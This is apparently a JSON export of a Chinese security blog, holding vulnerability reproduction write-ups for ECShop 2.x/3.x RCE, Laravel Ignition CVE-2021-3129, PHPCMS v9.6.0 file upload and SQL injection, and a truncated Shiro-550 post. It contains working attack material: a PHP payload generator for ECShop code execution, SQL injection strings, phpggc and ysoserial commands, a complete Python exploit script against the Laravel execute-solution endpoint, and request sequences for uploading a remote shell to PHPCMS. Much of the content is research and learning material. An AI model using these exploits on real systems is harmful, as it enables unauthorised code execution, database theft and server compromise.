{"pages":[{"title":"search","text":"","link":"/search/index.html"},{"title":"分类 ~","text":"","link":"/categories/index.html"},{"title":"标签 ~","text":"","link":"/tags/index.html"},{"title":"友情链接","text":"D0g3 team P1g3: http://payloads.info/ Threezh1: https://threezh1.com/ Loong716: https://loong716.top/ More D0g3er: https://www.d0g3.cn/about 其他小伙伴 离怀秋: https://lihuaiqiu.github.io/ Decade: https://wulidecade.cn/","link":"/link/index.html"},{"title":"","text":"CUIT 在读 Wechat: U2VjLU1pbgo== D0g3 道格安全研究实验室成员 Tencent 安全专家咨询中心（实习）2020.04-2021.1","link":"/about/index.html"}],"posts":[{"title":"360网络安全职业认证 - CSSJ","text":"学校这边政策是大二之前可以免费考试。含金量未知，留个纪念。","link":"/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/"},{"title":"ECShop 3.6.x RCE 漏洞分析","text":"两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习 近日笔者又看到了 4.0 版本的 SQL 注入漏洞分析，一个 nday 到 0day 挖掘的利用思路。本想连着一起复现分析，可是没有找到 4.0的安装包 3.6.x RCE漏洞复现Vulhub上已经有现成的利用脚本 &lt;?php$shell = bin2hex(&quot;{\\$asd&apos;];phpinfo\\t();//}xxx&quot;);$id = &quot;-1&apos; UNION/*&quot;;$arr = [ &quot;num&quot; =&gt; sprintf(&apos;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&apos;, bin2hex($id), $shell), &quot;id&quot; =&gt; $id];$s = serialize($arr);$hash3 = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;;$hash2 = &apos;554fcae493e564ee0dc75bdf2ebf94ca&apos;;echo &quot;POC for ECShop 2.x: \\n&quot;;echo &quot;{$hash2}ads|{$s}{$hash2}&quot;;echo &quot;\\n\\nPOC for ECShop 3.x: \\n&quot;;echo &quot;{$hash3}ads|{$s}{$hash3}&quot;; 漏洞分析触发流程定位触发点 /user.php： 对 $back_act 附值， 其实这个地方相当于 Referer 字段不包含 user.php 的前提下能达到 $back_act 的变量可控 变量传递 跟进，这里进行了变量注册。将 $back_act 注册成了 $this-&gt;_var[$tpl_var] 下面跟进 display ，/includes/cls_template.php 为模版类， display 为页面显示函数 跟进 fetch，主要为模版处理文件。处理的 filename 为 user_passport.dwt 其中这里会触发编译模版函数 跟进make_compiled , 会返回处理好的 hmtl 内容。然后附值给 out 之后会返回 display 函数继续处理未处理的流程，strpos 判断这里是至关重要的一点，涉及到了之后需要调用的 insert_mod 。 $this-&gt;_echash 是之前 /includes/cls_template.php 定义好的 var $_echash = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;; 然后进行 foreach 循环执行 insert_mod 这里 if (($key % 2) == 1) 的作用看一下被切割的 k 就知道了 跟进 insert_mod， 主要完成这几件事儿： 用 | 分割变量 反序列化 para fun 变量的拼接 返回 $fun($para) 根据返回值引发思考， 我们目前得到的返回值是：$fun($para) $fun($para) 的 fun 来自 insert_ + 被 explode 的前半部分 para 来自被 explode 的后半部分 那么漏洞利用思路就是执行拼接了 insert_ 的可控函数 问题剖析 问题一 首先是 $back_act 附值方式，为什么采用 Referer 头传入？ 其实还有很多其他附值方法： emample:$back_act = isset($_POST[&apos;back_act&apos;]) ? trim($_POST[&apos;back_act&apos;]) : &apos;&apos;; 究其核心原因： /includes/init.php addslashes_deep 问题二 为什么字符串是序列化字符串？ /includes/cls_template.php#insert_mod 先分割，再反序列化 问题三 如何bypass 主要过滤 function smarty_prefilter_preCompile($source){ ··· $pattern = array( &apos;/&lt;!--[^&gt;|\\n]*?({.+?})[^&lt;|{|\\n]*?--&gt;/&apos;, // 替换smarty注释 &apos;/&lt;!--[^&lt;|&gt;|{|\\n]*?--&gt;/&apos;, // 替换不换行的html注释 &apos;/(href=[&quot;|\\&apos;])\\.\\.\\/(.*?)([&quot;|\\&apos;])/i&apos;, // 替换相对链接 &apos;/((?:background|src)\\s*=\\s*[&quot;|\\&apos;])(?:\\.\\/|\\.\\.\\/)?(images\\/.*?[&quot;|\\&apos;])/is&apos;, // 在images前加上 $tmp_dir &apos;/((?:background|background-image):\\s*?url\\()(?:\\.\\/|\\.\\.\\/)?(images\\/)/is&apos;, // 在images前加上 $tmp_dir &apos;/([\\&apos;|&quot;])\\.\\.\\//is&apos;, // 以../开头的路径全部修正为空 ); $replace = array( &apos;\\1&apos;, &apos;&apos;, &apos;\\1\\2\\3&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; ); return preg_replace($pattern, $replace, $source); } SQLi（云复现）3.x版本引入了 /includes/safety.php 进行过滤。所以 3.x 版本 理论上是不存在 SQL 注入的 但是为了学习思路，还是云复现一下这个 2.x 版本可以利用的漏洞。 之前分析到寻找可控函数进行调用。网上用的都是 insert_ads 这个函数 关于 SQL 注入的利用思考可以参考这篇文章：https://xz.aliyun.com/t/2725 注释掉了 waf 相关的函数（绕不过去），payload 如下 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:57:&quot;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&quot;;} 执行的相应 SQL 语句： SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop360`.`ecs_ad` AS a LEFT JOIN `ecshop360`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= &apos;1606229787&apos; AND end_time &gt;= &apos;1606229787&apos; AND a.position_id = &apos;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&apos; ORDER BY rnd LIMIT 669 RCE回顾 /includes/lib_insert.php#insert_ads function insert_ads($arr){ static $static_res = NULL; $time = gmtime(); if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1) { $sql = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; . &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; . &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;. &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; . &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;. &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; . &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;]; $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql); } $ads = array(); $position_style = &apos;&apos;; foreach ($res AS $row) { if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) { continue; } ········ $position_style = &apos;str:&apos; . $position_style; $need_cache = $GLOBALS[&apos;smarty&apos;]-&gt;caching; $GLOBALS[&apos;smarty&apos;]-&gt;caching = false; $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads); $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); $GLOBALS[&apos;smarty&apos;]-&gt;caching = $need_cache; return $val;} 在这一步关键的附值，$row[&apos;position_style&apos;] 来自$res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql) 查询后 foreach 遍历的结果。有几个关注的点： 首先关注 $position_style 这个变量 关注 $row[&apos;position_id&apos;] != $arr[&apos;id&apos;] （相等调用 $position_style = $row[&apos;position_style&apos;];） 在下面完成拼接 会调用 fetch /includes/cls_template.php 145 行是一个关键点。无非两个函数： fetch_str _eval 肯定首先得 fetch_str 处理截断后的 filename ，也就是{$asd&apos;];phpinfo\\t();//}xxx 后面经过一顿操作，各种替换之后，原来的值变成了 $asd&apos;];phpinfo\\t();// 进入 select 函数，关键点如下。返回值是直接 php echo 出来的 后面的过程在第一次分析的时候是懵逼的，其实是缺乏了对前面 SQL 语句的大局观，而且流程很杂，各种 replace 的替换和各种 if。 @badcode 从宏观上总结的 SQL 语句和最后 position_style 的关系已经很简洁了。我这里不再复述 接下来就是把构造好的代码通过SQL注入漏洞传给$position_style。 这里可以用union select 来控制查询的结果，根据之前的流程，$row[&apos;position_id&apos;]和$arr[&apos;id&apos;]要相等，$row[&apos;position_id&apos;]是第二列的结果，$position_style是第九列的结果。$arr[&apos;id&apos;]传入&apos; /*,$arr[&apos;num&apos;]传入*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -，0x27202f2a是&apos; /*的16进制值，也就是$row[&apos;position_id&apos;]的值，0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d是上面构造的php代码的16进制值，也就是$position_style。 get_var 中会调用 make_var，最后返回值 论 $position_style 的演变 {$asd&apos;];phpinfo\\t();//}xxx$res = $static_res[$arr[&apos;id&apos;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&apos;position_style&apos;];str:{$asd&apos;];phpinfo\\t();//}xxx$position_style = &apos;str:&apos; . $position_style; $asd&apos;];phpinfo\\t();//}xxxreturn preg_replace_callback(&quot;/{([^\\}\\{\\n]*)}/&quot;, function($r) use(&amp;$template){return $template-&gt;select($r[1]);}, $source);asd&apos;];phpinfo\\t();//elseif ($tag{0} == &apos;$&apos;){return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;} $this-&gt;_var[&apos;asd&apos;];phpinfo\\t();//&apos;]foreach ($t AS $val) { $p.= &apos;[\\&apos;&apos; . $val . &apos;\\&apos;]&apos;; } 最后输出 phpinfo() 4.0 SQLi没找到安装包233333…先咕咕咕了～～～ https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw http://foreversong.cn/archives/1556 参考链接https://paper.seebug.org/695/","link":"/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"title":"Laravel <= v8.4.2 debug mode RCE 漏洞分析","text":"CVE-2021-3129，利用思路非常有意思，值得记录和学习 漏洞分析报错情况这个漏洞是基于 Ignition &lt;= 2.5.1，Ignition 是 Laravel 6 版本之后的默认错误页面生成器 In addition to displaying beautiful stack traces, Ignition comes with solutions, small snippets of code that solve problems that you might encounter while developping your application. For instance, this is what happens if we use an unknown variable in a template: 抓到 Make variable optional 的包 流程分析上图可以看到请求的相关信息，可以根据路由定位一下相关代码 vendor/facade/ignition/src/IgnitionServiceProvider.php \\Facade\\Ignition\\IgnitionServiceProvider::registerHousekeepingRoutes Route::post(&apos;execute-solution&apos;, ExecuteSolutionController::class) -&gt;middleware(IgnitionConfigValueEnabled::class.&apos;:enableRunnableSolutions&apos;) -&gt;name(&apos;executeSolution&apos;); 这里会触发 ExecuteSolutionController 的 invoke \\Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController 会调用获取 solution 对象的 run 方法 public function __invoke( ExecuteSolutionRequest $request, SolutionProviderRepository $solutionProviderRepository) { $solution = $request-&gt;getRunnableSolution(); $solution-&gt;run($request-&gt;get(&apos;parameters&apos;, [])); return response(&apos;&apos;);} 后续还有更深的调用栈，这里就不展开分析 ExecuteSolutionController-&gt;__invoke()-&gt;ExecuteSolutionRequest-&gt;getRunnableSolution()-&gt;getSolution()-&gt;MakeViewVariableOptionalSolution-&gt;run() 最后漏洞的触发点在 file_get_contents public function run(array $parameters = []) { $output = $this-&gt;makeOptional($parameters); if ($output !== false) { file_put_contents($parameters[&apos;viewFile&apos;], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters[&apos;viewFile&apos;]); $newContents = str_replace(&apos;$&apos;.$parameters[&apos;variableName&apos;], &apos;$&apos;.$parameters[&apos;variableName&apos;].&quot; ?? &apos;&apos;&quot;, $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&apos;variableName&apos;]); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } The only input variable left is viewFile. If we make abstraction of variableName and all of its uses, we end up with the following code snippet: $contents = file_get_contents($parameters[&apos;viewFile&apos;]);file_put_contents($parameters[&apos;viewFile&apos;], $contents); 漏洞复现目前看到大概两个漏洞利用的方式 Phar 反序列化 Talking to PHP-FPM using FTP Phar 反序列化两种思路： phar 文件直接触发（需要上传点） log文件转换为 phar 文件（不需要上传点） 两种思路都是打的 laravel 的依赖的反序列化链 直接触发如果能直接上传一个 phar文件的话可以直接触发 ./phpggc monolog/rce1 system whoami --phar phar -o ./monolog1.gif 转换触发 默认情况下，包含每个PHP错误和堆栈跟踪的Laravel日志文件存储在中storage/log/laravel.log 漏洞利用的核心思路是将 log 文件转换成 phar 文件，从而触发 phar 反序列化 清空 log 文件viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log 核心思路是：php://filter中的convert.base64-decode过滤器的特性为转换base64时会将不是base64的字符清空 PS： 需要连续的两次返回为 200 的 status 才能完全清空 log 给log添加一条前缀viewFile: AA 写入 phar 数据进 log 文件php -d&apos;phar.readonly=0&apos; ./phpggc monolog/rce1 system whoami --phar phar -o php://output | base64 -w0 再用 python 进行转换 import base64s = [PAYLOAD]&apos;&apos;.join([&quot;=&quot; + hex(ord(i))[2:] + &quot;=00&quot; for i in s]).upper() 将编码后的字符直接写进文件 viewFile: [PAYLOAD] 触发 Phar 反序列化先将文件内容解码成只有 Phar 的文件 viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log 最后用伪协议触发 Phar 反序列化 viewFile: phar:///Applications/MAMP/htdocs/laravel/storage/logs/laravel.log/test.txt 大坑MAMP 神仙环境，最后将文件内容解码的时候无法解压成 phar 格式内容 最后一步过滤文件内容的时候在环境上打过去一直 500 重写了一个代码复现的 &lt;?php$contents = file_get_contents(&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;);file_put_contents(&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/Applications/MAMP/htdocs/laravel/storage/logs/laravel.log&quot;, $contents);?&gt; final POC https://github.com/P2hm1n/vulnExploit/blob/main/laravel_debugmode_rce.py import requestsurl = &quot;http://laravel:80/index.php/_ignition/execute-solution&quot;headers = { &quot;Accept&quot;: &quot;application/json&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;}vul_json = { &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: { &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;&quot; }}def clearLog(): global url, headers, vul_json vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot; while True: res1 = requests.post(url, headers=headers, json=vul_json, verify=False) if res1 and res1.status_code == 200: res2 = requests.post(url, headers=headers, json=vul_json, verify=False) if res2 and res2.status_code == 200: print(&quot;clear&quot;) breakdef getphar(): global url, headers, vul_json # while True: clearLog() vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;AA&quot; res1 = requests.post(url, headers=headers, json=vul_json, verify=False) if &apos;file_get_contents(AA)&apos; in res1.text: vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;=55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00&quot; res2 = requests.post(url, headers=headers, json=vul_json, verify=False) if &apos;file_get_contents(&apos; in res2.text: vul_json[&quot;parameters&quot;][&quot;viewFile&quot;] = &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot; res3 = requests.post(url, headers=headers, json=vul_json, verify=False) if res3 and res3.status_code == 200: print(&quot;phar write&quot;)if __name__ == &quot;__main__&quot;: getphar() 后来跟 @lihuaiqiu 和 @decade 交流 MAMP 环境失败的原因，发现是 MAMP 没有相关的扩展 Talking to PHP-FPM using FTP思路很不错，可以看这两篇文章 https://www.anquanke.com/post/id/226750#h2-0 https://security.immomo.com/blog/15 本地复现的时候弹不了shell回来 REF https://zhuanlan.zhihu.com/p/344568679 https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g","link":"/2021/01/18/Laravel-v8-4-2-debug-mode-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"PHPCMS v9.6.0 两个漏洞分析","text":"任意文件上传（CVE-2018-14399） + wap模块 SQL注入 任意文件上传（CVE-2018-14399）漏洞复现漏洞危害：该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。 漏洞触发位置在 会员注册 这个界面。地址为 ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 POST参数如下 siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=你的shell&gt;&amp;dosubmit=1&amp;protocol= 访问爆出上传地址 能shell 漏洞分析文件目录 phpcms/modules/member/index.php index.php 大致实现功能：会员前台管理中心、账号管理、收藏操作类 触发漏洞点方法是 register 大致逻辑是 获取用户siteid，定义站点id常量，加载用户模块配置，加载短信模块配置 第 134-135 行 发现可控变量 $_POST[‘info’] 经过漏洞复现我们可以知道这是 exp 的关键参数 先看 134 行的处理，将 $_POST[‘info’] 这个参数经过了new_html_special_chars这个函数过滤。跟进函数分析 /** * 返回经addslashe处理过的字符串或数组 * @param $obj 需要处理的字符串或数组 * @return mixed */function new_html_special_chars($string) { $encoding = &apos;utf-8&apos;; if(strtolower(CHARSET)==&apos;gbk&apos;) $encoding = &apos;gb2312&apos;; if(!is_array($string)) return htmlspecialchars($string,ENT_COMPAT,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;} 主要功能是做了 html 转义。对我们漏洞利用没有太大阻碍。接着跟进一下 135行的 $member_input-&gt;get() 方法 方法位置：caches/caches_model/caches_data/member_input.class.php function get($data) { $this-&gt;data = $data = trim_script($data); $model_cache = getcache(&apos;member_model&apos;, &apos;commons&apos;); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid][&apos;tablename&apos;]; $info = array(); $debar_filed = array(&apos;catid&apos;,&apos;title&apos;,&apos;style&apos;,&apos;thumb&apos;,&apos;status&apos;,&apos;islink&apos;,&apos;description&apos;); if(is_array($data)) { foreach($data as $field=&gt;$value) { if($data[&apos;islink&apos;]==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field][&apos;name&apos;]; $minlength = $this-&gt;fields[$field][&apos;minlength&apos;]; $maxlength = $this-&gt;fields[$field][&apos;maxlength&apos;]; $pattern = $this-&gt;fields[$field][&apos;pattern&apos;]; $errortips = $this-&gt;fields[$field][&apos;errortips&apos;]; if(empty($errortips)) $errortips = &quot;$name 不符合要求！&quot;; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(&quot;$name 不得少于 $minlength 个字符！&quot;); if (!array_key_exists($field, $this-&gt;fields)) showmessage(&apos;模型中不存在&apos;.$field.&apos;字段&apos;); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) { showmessage(&quot;$name 不得超过 $maxlength 个字符！&quot;); } else { str_cut($value, $maxlength); } if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field][&apos;isunique&apos;] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != &apos;edit&apos;) showmessage(&quot;$name 的值不得重复！&quot;); $func = $this-&gt;fields[$field][&apos;formtype&apos;]; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; } } return $info;} 首先将 data 经过一个 trim_script 的处理。但是 trim_script 大多都是处理 xss 有关漏洞的过滤。几个正则将xss的关键 payload 进行了替换 第27行，核心 if 判断条件 if(is_array($data)) 。我们 payload 中 info[content]=&lt;img src=你的shell&gt; 就是一个数组。因此继续跟进，发现将数组进行遍历，键名为$field，键值为$value 第30行，$field 进行一次 safe_replace 处理。主要过滤一些类似单引号，尖括号等可能产生 XSS，SQL注入的符号 之后经过一些注册时正常的判断逻辑代码 47-48行 $func = $this-&gt;fields[$field][&apos;formtype&apos;];if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); 先是定义了一个 $func ，然后下面的if语句判断方法如果存在就带入这个函数。 挨个查看方法中，在 editor 方法中 的一句话。调用了 attachment 类的 download 函数 $value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); 跟进文件 phpcms/libs/classes/attachment.class.php /** * 附件下载 * Enter description here ... * @param $field 预留字段 * @param $value 传入下载内容 * @param $watermark 是否加入水印 * @param $ext 下载扩展名 * @param $absurl 绝对路径 * @param $basehref */ function download($field, $value,$watermark = &apos;0&apos;,$ext = &apos;gif|jpg|jpeg|bmp|png&apos;, $absurl = &apos;&apos;, $basehref = &apos;&apos;) { global $image_d; $this-&gt;att_db = pc_base::load_model(&apos;attachment_model&apos;); $upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;); $this-&gt;field = $field; $dir = date(&apos;Y/md/&apos;); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) { if(strpos($matche, &apos;://&apos;) === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); } unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) { if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) { $oldpath[] = $k; $GLOBALS[&apos;downloadfiles&apos;][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark){ watermark($newfile, $newfile,$this-&gt;siteid); } $filepath = $dir.$filename; $downloadedfile = array(&apos;filename&apos;=&gt;$filename, &apos;filepath&apos;=&gt;$filepath, &apos;filesize&apos;=&gt;filesize($newfile), &apos;fileext&apos;=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; } } return str_replace($oldpath, $newpath, $value); } 首先限制了其中 $ext 只允许为gif|jpg|jpeg|bmp|png 153行 进行了一个过滤 if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; 这里匹配了src或href中文件的文件名，不过后缀为$ext，其中$ext的值为：gif|jpg|jpeg|bmp|png http://ip/p2hm1n.php#a.jpg 即可绕过正则 158行 使用了 fillurl 函数远程加载资源，还吧 # 之后的字符全部移除 $pos = strpos($surl,&apos;#&apos;);if($pos&gt;0) $surl = substr($surl,0,$pos); P2hm1n.php#a.jpg 会被处理成 P2hm1n.php 之后调用 download 方法。程序直接调用 copy 函数将远程文件复制到本地 wap模块 SQL注入漏洞复现访问 http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1 PS: 默认安装是不具备war模块的，跟进后台看了一下，好像跟手机门户网站有关，但其实并不影响漏洞的利用 直接发包至 repeater 模块。 将返回的 Set-Cookie 中TVAUD_siteid值附值给 userid_flash变量因此 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 访问 http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26 并 POST 传参 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 将返回的 Set-Cookie 中TVAUD_att_json值附值给 a_k参数 GET型访问 http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw 漏洞分析漏洞触发点在 phpcms/modules/content/down.php 的 init() 函数12 行 GET方式传入 a_k参数14 行 根据 DECODE 判断其 sys_auth 为一个解密函数。直接证明——》a_k参数之前是经过加密的。这个解密流程其实很长，我们其实不用去看它的一个解密流程。17 行 使用 parse_str() 函数处理 。 parse_str() 函数会自动对传入的值将其根据&amp;分割，然后解析到具体变量并注册变量，并且对内容进行URL解码操作。26 行 引用未注册变量 array(‘id’=&gt;$id) ，但这里的id可以从parse_str函数处理$a_k后得到。且调用 get_one 方法。 get_one方法定义点在 /phpcms/libs/classes/model.class.php 73-76行。跟进发现这里的 get_one 方法其实就是 SQL 查询。且用到了 sqls 方法。跟进 sqls 方法，这里是对数组参数的一个处理过程。且从头到位都没有对$id 参数进行过滤处理。因此存在 sql 注入漏洞 现在我们根据 从parse_str函数处理$a_k后得到的 id 推断出了存在 sql注入。但是由于之前我们推断中忽略的是一个解密流程。因此其实我们需要找到带有 sql注入payload 经过一次加密之后的 payload。 核心目的：构造加密后的 $a_k 变量 思路一：伪造加密过程：直接对应源码中加密代码，进行本地加解密。产生问题：源码中对应的 auth_key 值来自服务器。且每个站点这个 auth_key 可能不一样。 思路二：寻找源码中调用此加密的地方。且可回显加密后代码方法： 全局搜索 sys_auth 。phpcms\\libs\\classes\\param.class.php 中存在 set_cookie 方法寻找哪里没有过滤sql注入的传入点。且可通过 cookie 加密获得加密后 payload关键点：phpcms/modules/attachment/attachments.php 的 swfupload_json 方法。 public function swfupload_json() { $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]); $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;])); $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie(&apos;att_json&apos;); $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) { return true; } else { $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str; param::set_cookie(&apos;att_json&apos;,$json_str); return true; }} 通过 GET 传入三个参数，第一个参数 aid 经过了 intval 函数处理，那么不太适合通过此处传入payload。第二个参数 src 经过了 safe_replace处理。第三个 filename 通过 safe_replace 和 一次url 编码处理。之后做 json_encode 的操作，最终再调用 set_cookie 方法。跟进一下 safe_replace 方法，发现是通过 str_replace 进行处理，且没有通过循环遍历来过滤，它只执行一次。那么两两组合一下，然后替换，从而达到 bypass 的效果。 但是在触发 set_cookie 的 swfupload_json 方法，之前有一定的条件。在phpcms/modules/attachment/attachments.php第十行的 attachments 类。其中 __construct 方法，相当于做类的初始化工作。其中有用户登录状态检测。21行限制 $this→userid 不能为空，否则跳转到登录界面17 行 程序并没有检查 $this-&gt;userid 的有效性，所以只要传入的 userid_flash 是加密值就能够解密就可以通过检测。获取 userid_flash加密值：在phpcms/modules/wap/index.php 文件。通过 cookie 获取 $_GET[‘siteid’] 加密后的数据，然后再作为 $_POST[‘userid_flash’] 的值，即可绕过登录检测。 参考文章 https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/https://www.hackersb.cn/hacker/219.htmlhttps://www.freebuf.com/articles/web/202914.htmlhttp://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/","link":"/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Shiro-550 rememberMe 反序列化漏洞分析","text":"本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习 漏洞详情https://issues.apache.org/jira/browse/SHIRO-550 Affects Version/s:1.2.4 漏洞复现Check 采用空对象 Attack: ysoserial POC java -jar ysoserial.jar CommonsCollections2 &quot;open -a calculator&quot;|base64 |sed &apos;:label;N;s/\\n//;b label&apos; Exploit 漏洞分析Shiro 1.2.4及以下版本下默认 cookie 中 rememberMe 字段的生成过程 序列化恶意对象（payload） 对序列化的数据进行AES加密 